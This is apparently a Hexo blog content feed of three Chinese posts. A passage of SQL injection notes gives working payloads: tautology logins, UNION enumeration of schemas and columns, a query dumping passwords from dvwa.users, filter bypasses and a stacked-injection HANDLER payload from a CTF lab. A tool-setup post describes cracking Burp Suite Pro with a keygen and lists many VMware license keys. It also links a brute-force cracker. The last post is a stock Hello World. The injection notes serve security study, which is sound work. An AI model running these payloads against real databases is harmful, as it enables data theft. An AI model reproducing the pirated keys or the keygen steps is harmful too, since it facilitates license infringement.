<p><img src="https://cdn.nlark.com/yuque/0/2023/png/34873733/1674808437657-072df0a6-c90a-4865-8a58-25816de8ee4f.png#averageHue=%23f9f8f6&clientId=u2f371465-feeb-4&from=paste&height=370&id=u06745ca2&originHeight=555&originWidth=1203&originalType=binary&ratio=1&rotation=0&showTitle=false&size=101076&status=done&style=none&taskId=ucc811189-cd89-4280-942f-63e41b1b445&title=&width=802" alt="image.png"><br><a name="LZw8u"></a></p>
<h3 id="and-和or-运算符"><a href="#and-和or-运算符" class="headerlink" title="and 和or 运算符"></a>and 和or 运算符</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34873733/1674808606487-069b3aa9-9431-456b-ad6c-f65e69ad0df1.png#averageHue=%23e0d2a9&clientId=u2f371465-feeb-4&from=paste&height=191&id=u53b885e1&originHeight=286&originWidth=890&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59069&status=done&style=none&taskId=udf8e9d1b-d70d-452e-9fee-a8abaae2d12&title=&width=593.3333333333334" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/34873733/1674808646431-f07c0f76-62a7-451e-b345-53d5517dea22.png#averageHue=%23dfd1a9&clientId=u2f371465-feeb-4&from=paste&height=190&id=uf102ef80&originHeight=285&originWidth=921&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60551&status=done&style=none&taskId=u80e42f2c-699a-4ec5-b90d-0c9f5fcd138&title=&width=614" alt="image.png"><br />or语句，当判断结果为真就会全部查询出来，也就是万能钥匙<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/34873733/1674808762997-ff23c1dc-2dc4-45c8-8d94-d29308e239cd.png#averageHue=%23dcceaa&clientId=u2f371465-feeb-4&from=paste&height=280&id=u25b4c6ad&originHeight=420&originWidth=853&originalType=binary&ratio=1&rotation=0&showTitle=false&size=76570&status=done&style=none&taskId=u830277e8-bfd0-4190-b97b-c683eccae46&title=&width=568.6666666666666" alt="image.png"><br><a name="oLcui"></a></p>
<h3 id="union多表联合查询"><a href="#union多表联合查询" class="headerlink" title="union多表联合查询"></a>union多表联合查询</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34873733/1674809098617-aa9c7c8b-a544-4e54-9787-bfe302553fac.png#averageHue=%23dfd1a6&clientId=u2f371465-feeb-4&from=paste&height=225&id=uf9f0febc&originHeight=338&originWidth=1293&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74377&status=done&style=none&taskId=u6b96d398-a33e-49ee-9af8-ec856df55ea&title=&width=862" alt="image.png"><br />结果直接拼接显示， union可以对同一个表的两次查询联合起来<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/34873733/1674809314176-650e03a1-5400-4dbc-b209-de01b00b86c4.png#averageHue=%23dfd1a8&clientId=u2f371465-feeb-4&from=paste&height=214&id=u5a06fab2&originHeight=321&originWidth=1042&originalType=binary&ratio=1&rotation=0&showTitle=false&size=66615&status=done&style=none&taskId=u249e79c5-d475-448f-a5ae-8ebec32b5ee&title=&width=694.6666666666666" alt="image.png"><br />用来猜测字段<br><a name="Ok6BN"></a></p>
<h3 id="SQL注入-1"><a href="#SQL注入-1" class="headerlink" title="SQL注入"></a>SQL注入</h3><p><a name="HzRP5"></a></p>
<h4 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from t1 where id= x</span><br></pre></td></tr></table></figure>
<p>x&#x3D;1 or 1&#x3D;1(万能密码）<br />x&#x3D;1 union select 1,2,3…..(一个个尝试出字段)<br><a name="jOrv3"></a></p>
<h4 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from t1 where name= &#x27;x&#x27;</span><br></pre></td></tr></table></figure>
<p>x&#x3D;1’ or 1&#x3D;1 #—注释掉后面多出来的单引号<br><a name="pAeOV"></a></p>
<h4 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h4><p>通常情况下，可能存在 Sql 注入漏洞的 Url 是类似这种形式 ：<a href="http://xxx.xxx.xxx/abcd.php?id=XX">http://xxx.xxx.xxx/abcd.php?id=XX</a></p>
<ul>
<li>判断注入点(是否存在sql注入,如果存在属于哪种注入)</li>
<li>判断是否存在漏洞( 最为经典的<strong>单引号判断法</strong>：在参数后面加上单引号, 如果页面返回错误，则存在 Sql 注入。<br />原因是无论字符型还是整型都会因为单引号个数不匹配而报错。如果未报错，不代表不存在 Sql 注入，因为有可能页面对单引号做了过滤)</li>
<li>判断注入类型<br><a name="LVmdK"></a></li>
</ul>
<h3 id="GROUP-CONCAT-函数"><a href="#GROUP-CONCAT-函数" class="headerlink" title="GROUP_CONCAT()函数"></a>GROUP_CONCAT()函数</h3><p>将多个字符串拼接成一个字符串<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/34873733/1674810905399-4d34761c-1974-43c4-8df6-19d52aaa7042.png#averageHue=%23d9cfa8&clientId=u2f371465-feeb-4&from=paste&height=238&id=u5f30fef9&originHeight=357&originWidth=847&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75283&status=done&style=none&taskId=u1e79e750-5836-4670-9b35-0e0cd01b12d&title=&width=564.6666666666666" alt="image.png"><br><a name="IKhG1"></a></p>
<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p><code>字段数-&gt;回显位置-&gt;查阅库名-&gt;表名-&gt;字段名-&gt;查阅数据</code></p>
<ul>
<li>查库名</li>
</ul>
<p>SELECT DATABASE();– 能够知道当前在哪个数据库<br />select information_schema.<code>SCHEMATA</code><br /><strong>查询所有库名:</strong></p>
<blockquote>
<p>‘ union select 1,group_concat(schema_name) from information_schema.schemata – ‘</p>
</blockquote>
<blockquote>
<p>-1’ union select 1,database()#</p>
</blockquote>
<p><strong>查表名</strong></p>
<blockquote>
<p>‘ union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’数据库的名称’#</p>
</blockquote>
<blockquote>
<p>1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() –+</p>
</blockquote>
<p><strong>查字段</strong></p>
<blockquote>
<p>‘ union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’</p>
</blockquote>
<p><strong>查获取字段信息</strong></p>
<blockquote>
<p>‘ union select 1,group_concat(password) from dvwa.users – ‘</p>
</blockquote>
<p><a name="pDTCa"></a></p>
<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>&#x2F;**&#x2F;<br />%09<br />%0a等,详情参考命令执行绕过<br><a name="ti7bT"></a></p>
<h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><p>– 注释符<br />#<br />&#x2F;**&#x2F;– 一般可以用来绕过空格<br />SHOW DATABASES; – 显示MySQL所有数据库名称<br />SHOW TABLES; – 显示当前数据库中所有表的名称<br />SHOW TABLES FROM sys; – 作用同上 from后面加数据库名<br />– use 数据库名 如果数据库存在，选择进入该数据库<br />USE mysql;<br />#select 查询数据,展示<br />SELECT DATABASE();– 能够知道当前在哪个数据库<br />SELECT VERSION(); – 查询当前数据库版本，知道存在的漏洞<br />SELECT USER(); – 查询用户名<br /># *代指所有的意思<br />#SELECT 列名称,列名称 FROM 表名称 – （从表中读取几列）<br />SELECT *（即所有的列） FROM TABLES;<br />SELECT TABLE_CATALOG FROM TABLES;<br />SELECT * FROM SCHEMATA ;– 当前root中所有数据库的信息<br />SELECT * FROM COLUMNS  – 能够看到属于哪个表，哪个数据库<br><a name="WV575"></a></p>
<h1 id="截断函数"><a href="#截断函数" class="headerlink" title="截断函数"></a>截断函数</h1><p>位数不足,需要使用截断函数进行绕过<br /> substr，right，REVERSE  ,mid函数<br /><strong>SUBSTR (str, pos, len)</strong><br />参数说明:</p>
<ul>
<li>str为列名&#x2F;字符串；</li>
<li>pos为起始位置；mysql中的起始位置pos是从1开始的；如果为正数，就表示从正数的位置往下截取字符串（起始坐标从1开始），反之如果起始位置pos为负数，那么 表示就从倒数第几个开始截取；</li>
<li>len为截取字符个数&#x2F;长度。</li>
</ul>
<p>RIGHT(string, number_of_chars)从右侧开始读取,前一个为字符串,后一个为读取的字符数量<br />REVERSE(string)反转字符串<br />MID(string, start, length)中间为从第几位开始,最后为读取的数量<br><a name="rvOk7"></a></p>
<h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>堆叠注入原理:利用分号作为结束符,执行多条语句<br />首先判断注入类型<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1706444571064-b7f92ad2-6d26-4eb2-a44c-2bd348882f3e.png#averageHue=%23fafafa&clientId=u809d023a-9013-4&from=paste&height=548&id=ubad442f7&originHeight=822&originWidth=1627&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=54681&status=done&style=none&taskId=u48e92237-1a53-4400-899a-8e8576a161d&title=&width=1084.6666666666667" alt="image.png"><br />为字符型<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1706444627314-dabb80cc-d2a1-48e7-bec7-3b3d10846405.png#averageHue=%23fafafa&clientId=u809d023a-9013-4&from=paste&height=503&id=u555acd2e&originHeight=755&originWidth=974&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=39471&status=done&style=none&taskId=u98c1766d-a86b-4cd5-a533-7b0b993d493&title=&width=649.3333333333334" alt="image.png"><br />判断长度为2<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1706444663785-9a67cd93-fe3c-4cb9-abd1-87e90d7c2c25.png#averageHue=%23f9f9f9&clientId=u809d023a-9013-4&from=paste&height=493&id=uba2839be&originHeight=739&originWidth=992&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=38232&status=done&style=none&taskId=ueda4f061-d01f-4baf-bb08-23c1fca6b54&title=&width=661.3333333333334" alt="image.png"><br />select被过滤,结合题目,尝试堆叠注入<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1706444793852-f5deee4d-7b21-4961-a6b8-e5739c12eee9.png#averageHue=%23f6f6f6&clientId=u809d023a-9013-4&from=paste&height=637&id=u4afe72d3&originHeight=956&originWidth=1399&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=93468&status=done&style=none&taskId=ua9a0e5c3-c9c6-4512-b00c-44a2a2ad8d2&title=&width=932.6666666666666" alt="image.png"><br />用show tables产看当前数据库的表名<br />之后再用<code>show columns form+</code>表名&#96;&#96;查看每个表里面的字段名<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1706445028757-7d54fb3f-a99c-49a0-8f44-f175ccc22592.png#averageHue=%23f9f9f9&clientId=u809d023a-9013-4&from=paste&height=521&id=u4e8098e2&originHeight=782&originWidth=1371&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=65230&status=done&style=none&taskId=uaae8720b-847b-4bfd-ae1a-7fa61247e44&title=&width=914" alt="image.png"><br />由于select被过滤了,大写无法绕过,因此换用另一种方法来读取内容<br><a name="vI7of"></a></p>
<h2 id="handler-句柄"><a href="#handler-句柄" class="headerlink" title="handler(句柄)"></a>handler(句柄)</h2><p>类似于指针,通过得到的表名,读取表的内容</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#打开句柄</span><br><span class="line">handler handler_table <span class="keyword">open</span>;</span><br><span class="line"># 获取第一行数据</span><br><span class="line">handler p read handler_index <span class="keyword">first</span>;</span><br><span class="line"># 获取下一行数据</span><br><span class="line">handler p read handler_index next;</span><br><span class="line"># 获取上一行数据</span><br><span class="line">handler p read handler_index prev;</span><br><span class="line"># 获取最后一行数据</span><br><span class="line">handler p read handler_index <span class="keyword">last</span>;</span><br><span class="line"># 关闭句柄</span><br><span class="line">handler p <span class="keyword">close</span>;</span><br><span class="line">p指代表名</span><br></pre></td></tr></table></figure>
<p>payload<br /><code>?inject=-1&#39;;handler </code>1919810931114514<code>open;handler</code>1919810931114514<code>read first; --+</code><br /><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1706445410964-032c03e6-ee8b-4bd2-9c26-34b947ce1264.png#averageHue=%23f9f9f9&clientId=u809d023a-9013-4&from=paste&height=475&id=ucc22305a&originHeight=712&originWidth=1802&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=56810&status=done&style=none&taskId=u854ae8fc-4f0f-43cd-bcdf-7847954f94c&title=&width=1201.3333333333333" alt="image.png"></p>
]]></content>
      <categories>
        <category>SQL</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>工具安装</title>
    <url>/2024/08/10/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<p>掉盘重装系统后记录了web工具的安装</p>
<span id="more"></span>
<h1 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h1><h2 id="首先配置JAVA环境"><a href="#首先配置JAVA环境" class="headerlink" title="首先配置JAVA环境"></a>首先配置JAVA环境</h2><p>下载地址：<a href="https://download.java.net/openjdk/jdk11/ri/openjdk-11+28_windows-x64_bin.zip"><em>https://download.java.net/openjdk/jdk11/ri/openjdk-11+28_windows-x64_bin.zip</em></a><br>也可以直接到官网下载<br>此电脑右键-&gt;属性-&gt;高级系统设置-&gt;环境变量<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1722172909055-a45a8d77-39a6-4e92-ad31-43066b8323fc.png#averageHue=%23f1f1f0&clientId=ufdcf341c-1fad-4&from=paste&height=167&id=u5a5e4551&originHeight=251&originWidth=1026&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=14333&status=done&style=none&taskId=ufba31dfb-df95-417c-80cd-55f902abf24&title=&width=684" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1722172926502-36850004-cf8d-483c-8659-64e71c5f79cc.png#averageHue=%23eeeded&clientId=ufdcf341c-1fad-4&from=paste&height=182&id=uf4c35a0e&originHeight=273&originWidth=1040&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=18825&status=done&style=none&taskId=ued77a340-fe03-4941-8523-8297263ef58&title=&width=693.3333333333334" alt="image.png"><br>Path中添加路径<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1722172962775-f3c71d35-d16f-45aa-832d-58c81e6ea7fd.png#averageHue=%23f4f2f1&clientId=ufdcf341c-1fad-4&from=paste&height=531&id=ue29262f6&originHeight=797&originWidth=829&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=60518&status=done&style=none&taskId=u7c1dd4b1-eef8-43a5-9c7c-ac1a1290778&title=&width=552.6666666666666" alt="image.png"><br>win+cmd，输入java -version，能看到Java版本即配置成功<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1722173050618-df84df25-83f5-452d-90e5-ea6ee2264b19.png#averageHue=%23446b94&clientId=ufdcf341c-1fad-4&from=paste&height=121&id=uaee14619&originHeight=181&originWidth=1131&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=307987&status=done&style=none&taskId=ue4739175-59f3-48d9-a8e5-47d8ba96d66&title=&width=754" alt="image.png"></p>
<h2 id="Burpsuite下载"><a href="#Burpsuite下载" class="headerlink" title="Burpsuite下载"></a>Burpsuite下载</h2><p>地址：官网<a href="https://portswigger.net/burp/releases"><em>https://portswigger.net/burp/releases</em></a></p>
<p>注册机地址：<br>下载对应版本的注册机，在cmd窗口运行<br><code>java -jar BurpLoaderKeygen.jar</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1722176530486-a798a55c-bcd7-43d3-9928-d85f7b2525f1.png#averageHue=%23f5f3f2&clientId=ufdcf341c-1fad-4&from=paste&height=494&id=u24b50fae&originHeight=741&originWidth=1182&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=74984&status=done&style=none&taskId=u40738913-4c40-48c3-b06c-0df19e1b970&title=&width=788" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1722176625673-a7a755dc-7113-49fe-aa5d-c38f8c42876b.png#averageHue=%23f4f2f2&clientId=ufdcf341c-1fad-4&from=paste&height=494&id=u941c9e2a&originHeight=741&originWidth=1516&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=105541&status=done&style=none&taskId=u0ebce3ea-8d0c-4b1c-8b7f-8e74940baba&title=&width=1010.6666666666666" alt="image.png"><br>点击下一步<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1722176659530-2569be75-c3c8-400f-bc6f-c0a129111d1e.png#averageHue=%23f7f4f3&clientId=ufdcf341c-1fad-4&from=paste&height=426&id=u921d5d38&originHeight=639&originWidth=748&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=34016&status=done&style=none&taskId=u450b3048-9847-4b7c-8fa0-7d887a6bb7e&title=&width=498.6666666666667" alt="image.png"><br>选择手动激活<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1722176741240-306941ee-c5d2-49f5-b27d-7a00bf39fe29.png#averageHue=%23f1ebe9&clientId=ufdcf341c-1fad-4&from=paste&height=494&id=u22f98a17&originHeight=741&originWidth=1921&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=223428&status=done&style=none&taskId=u7d53a2fb-4b3e-4494-b99b-f8061649f34&title=&width=1280.6666666666667" alt="image.png"><br>快捷启动：<br>复制<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1722178785557-f6f0d032-2dd2-47cc-bd34-6eb107819267.png#averageHue=%23f6f5f4&clientId=ufdcf341c-1fad-4&from=paste&height=494&id=u7e174a36&originHeight=741&originWidth=1182&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=66165&status=done&style=none&taskId=ua6b3ae46-a406-4a73-b195-10cfe53574e&title=&width=788" alt="image.png"><br>将内容写入到Java.bat<br>消除CMD运行框</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Set</span> <span class="variable">ws</span> <span class="operator">=</span> CreateObject(<span class="string">&quot;Wscript.Shell&quot;</span>) </span><br><span class="line">ws.run <span class="string">&quot;cmd /c D:\appdownload\BurpSuitePro\java.bat &quot;</span>,vbhide  <span class="comment">//隐藏窗口</span></span><br><span class="line"></span><br><span class="line"><span class="type">Set</span> <span class="variable">ws</span> <span class="operator">=</span> CreateObject(<span class="string">&quot;Wscript.Shell&quot;</span>) </span><br><span class="line">ws.run <span class="string">&quot;java.bat &quot;</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>写入到start.vds,注意更换目录名<br>谷歌浏览器配置<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1722183008786-0c935dec-afa9-4dea-a0db-d175295757e9.png#averageHue=%23f3f3f3&clientId=ufdcf341c-1fad-4&from=paste&height=115&id=uae6f8473&originHeight=172&originWidth=777&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=23601&status=done&style=none&taskId=u95539ccc-8c2c-4575-a925-2e710052895&title=&width=518" alt="image.png"><br>扩展下载<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1722182993561-1d50dd17-6742-4cea-a15a-ccfef822791a.png#averageHue=%23fbfafa&clientId=ufdcf341c-1fad-4&from=paste&height=567&id=uc4b259b7&originHeight=850&originWidth=1326&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=69744&status=done&style=none&taskId=u8aa67037-fbec-43c5-bcd6-c84d65d1f2b&title=&width=884" alt="image.png"><br>从burpsuite中导出证书<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1722183910452-b1b7e2db-fef6-4ad0-96bf-781a85729c93.png#averageHue=%23f7f5f5&clientId=ufdcf341c-1fad-4&from=paste&height=744&id=ubf32be6a&originHeight=1116&originWidth=1872&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=180982&status=done&style=none&taskId=ucbd4544c-2296-4cfd-81f6-3b105002071&title=&width=1248" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1722183997124-a5a30a17-915b-4996-befe-3912dbd9c325.png#averageHue=%23f9f7f6&clientId=ufdcf341c-1fad-4&from=paste&height=426&id=u68484908&originHeight=639&originWidth=748&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=24488&status=done&style=none&taskId=ub852394d-f697-47c2-926f-4470b3a9cd0&title=&width=498.6666666666667" alt="image.png"><br>同级目录下即可查看到证书<br>谷歌浏览器-&gt;设置-&gt;隐私与安全-&gt;安全-&gt;管理证书<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1722184141023-a7419cdd-5c67-43b6-a23b-64b4b370bf56.png#averageHue=%23f2f0ef&clientId=ufdcf341c-1fad-4&from=paste&height=566&id=u59c1aecc&originHeight=849&originWidth=925&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=60314&status=done&style=none&taskId=u78aac7e1-295a-4d90-b0d9-7b10c184f17&title=&width=616.6666666666666" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1722184209340-e79e1051-8d88-42ed-8d07-84263007e60c.png#averageHue=%23fbfafa&clientId=ufdcf341c-1fad-4&from=paste&height=602&id=u8ed61932&originHeight=903&originWidth=962&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=39973&status=done&style=none&taskId=u0aaa5f6c-ca94-4898-8e24-7fc8e06f23b&title=&width=641.3333333333334" alt="image.png"><br>一直点下一步就行了</p>
<h1 id="Termius"><a href="#Termius" class="headerlink" title="Termius"></a>Termius</h1><p>下载地址;<a href="https://www.douban.com/link2/?url=https://soft.macxf.com/soft/3309.html?id=MjkzNjc%253D&link2key=7ba555221b">Windows下载：Termius中文安装包</a></p>
<h2 id="SFTP"><a href="#SFTP" class="headerlink" title="SFTP"></a>SFTP</h2><p>可以把本机的文件上传到vps上<br>nano编辑器退出：同时按住y和enter保存并退出</p>
<h1 id="Node-js-Javascript）"><a href="#Node-js-Javascript）" class="headerlink" title="Node.js(Javascript）"></a>Node.js(Javascript）</h1><p>官网直接下载，自动配置路径<br>地址：<a href="https://nodejs.org/">Node.js官网</a></p>
<h1 id="子系统"><a href="#子系统" class="headerlink" title="子系统"></a>子系统</h1><p>搜索框找到启动或挂壁windows功能，按照图示开启功能，然后根据指示重启计算机<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1722242261862-d905646a-99c3-4a7f-82f3-3a1b344dd929.png#averageHue=%23f0edea&clientId=u1558547e-ce6c-4&from=paste&height=394&id=u56db0c19&originHeight=591&originWidth=625&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=63357&status=done&style=none&taskId=ue3ccdcc3-6684-49bc-b7c8-ea87ec5dfe8&title=&width=416.6666666666667" alt="image.png"><br>配置wsl：<a href="https://link.zhihu.com/?target=https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi">wsl下载ios</a><br>微软商店下载Ubuntu LST设置好用户名和密码即可<br>win+r进入cmd，输入wsl即进入虚拟机</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1722242568781-fa9eef8f-768c-47ee-b20f-21982d070e5b.png#averageHue=%231d1d1d&clientId=u1558547e-ce6c-4&from=paste&height=167&id=ue6c3a511&originHeight=251&originWidth=1005&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=24591&status=done&style=none&taskId=u1793df1c-e644-471a-b63f-ed604ff4bd1&title=&width=670" alt="屏幕截图 2024-07-29 162636.png"><br>这种情况就是没有装wsl</p>
<h2 id="提权为root"><a href="#提权为root" class="headerlink" title="提权为root"></a>提权为root</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1722243399718-5eea727b-3550-4732-a1ac-11207312164c.png#averageHue=%23f8f7f6&clientId=u1558547e-ce6c-4&from=paste&height=644&id=uc46f0d74&originHeight=966&originWidth=1393&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=187323&status=done&style=none&taskId=ud6812716-bd6d-4692-9249-5d7d06bd005&title=&width=928.6666666666666" alt="image.png"><br>确认版本名<br>在cmd窗口运行命令行<code>ubuntu2204.exe config --default-user root</code>成功后进入wsl即为root<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1722243503545-6bbd92d5-c2a5-47e3-bf12-8ee2ebf9070c.png#averageHue=%237d8e90&clientId=u1558547e-ce6c-4&from=paste&height=339&id=u9cb07f11&originHeight=508&originWidth=1199&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=645506&status=done&style=none&taskId=u3b5e6552-7331-4395-8f2f-85a58f29812&title=&width=799.3333333333334" alt="image.png"></p>
<h1 id="VM"><a href="#VM" class="headerlink" title="VM"></a>VM</h1><p><strong>激活密钥许可证</strong><br><strong>VM17 激活许可证</strong><br>MC60H-DWHD5-H80U9-6V85M-8280D<br>JU090-6039P-08409-8J0QH-2YR7F<br>5Y012-8HL8P-0J8U0-032Q6-93KKF<br><strong>VM16 激活许可证</strong><br>ZF3R0-FHED2-M80TY-8QYGC-NPKYF<br><strong>VM15 激活许可证</strong><br>UY758-0RXEQ-M81WP-8ZM7Z-Y3HDA<br>VF750-4MX5Q-488DQ-9WZE9-ZY2D6<br>UU54R-FVD91-488PP-7NNGC-ZFAX6<br>YC74H-FGF92-081VZ-R5QNG-P6RY4<br>YC34H-6WWDK-085MQ-JYPNX-NZRA2<br><strong>VM14 激活许可证</strong><br>FF31K-AHZD1-H8ETZ-8WWEZ-WUUVA<br>CV7T2-6WY5Q-48EWP-ZXY7X-QGUWD<br><strong>VM12 激活许可证</strong><br>5A02H-AU243-TZJ49-GTC7K-3C61N<br>VF5XA-FNDDJ-085GZ-4NXZ9-N20E6<br>UC5MR-8NE16-H81WY-R7QGV-QG2D8<br>ZG1WH-ATY96-H80QP-X7PEX-Y30V4<br>AA3E0-0VDE1-0893Z-KGZ59-QGAVF<br><strong>VM10 激活许可证</strong><br>1Z0G9-67285-FZG78-ZL3Q2-234JG<br>4C4EK-89KDL-5ZFP9-1LA5P-2A0J0<br>HY086-4T01N-CZ3U0-CV0QM-13DNU</p>
<h1 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h1><p><a href="https://old.kali.org/kali-images/kali-2024.2/">https://old.kali.org/kali-images/kali-2024.2/</a><br>镜像源，选择istaller-amd64.ios，找教程一步步来</p>
<h2 id="kali无法使用键盘输入"><a href="#kali无法使用键盘输入" class="headerlink" title="kali无法使用键盘输入"></a>kali无法使用键盘输入</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1722335695504-9df5ea5e-8a12-4ea0-a96c-8188d680082b.png#averageHue=%231875b7&clientId=ud48b5fac-f207-4&from=paste&height=377&id=udcdabeb6&originHeight=566&originWidth=845&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=728354&status=done&style=none&taskId=u737cb3f3-ce91-45e4-b21b-f2d33600e07&title=&width=563.3333333333334" alt="image.png"><br>重启解决了</p>
<h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><p><a href="https://github.com/shack2/SNETCracker/releases">https://github.com/shack2/SNETCracker/releases</a></p>
<h1 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h1><p>安装后运行出问题，显示没有找到正确的库<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1723140663525-624b9fd2-7b8b-42da-8666-9610c886389e.png#averageHue=%2340543a&clientId=u2057485a-3e3d-4&from=paste&height=120&id=u80c70ea8&originHeight=180&originWidth=1324&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=353408&status=done&style=none&taskId=u791d8e80-edb4-4db8-8c9e-1d664edef2d&title=&width=882.6666666666666" alt="image.png"><br>解决办法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">pip install setuptools</span><br></pre></td></tr></table></figure>
<p>安装后后续能够使用，但是依旧会有该弹窗</p>
<h1 id="关于本机"><a href="#关于本机" class="headerlink" title="关于本机"></a>关于本机</h1><p>在系统更新后，可能会无法识别扬声器，导致音量键没有声音，解决办法：<br>打开设备管理器-&gt;系统设备<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1723054130113-2f8b78f7-26f2-4376-bda1-893428f7a965.png#averageHue=%23f8f7f6&clientId=ud0e8f844-75a4-4&from=paste&height=572&id=u86b88181&originHeight=858&originWidth=1171&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=258665&status=done&style=none&taskId=ua1473269-ff10-47e6-8a0c-7c35ea57387&title=&width=780.6666666666666" alt="image.png"><br>发现出现感叹号的话右键重装即可恢复音量<br>也有可能是驱动器的问题，NVIDIAA检查一下更新<br>————2024&#x2F;8&#x2F;8</p>
]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2024/03/31/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<span id="more"></span>

<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
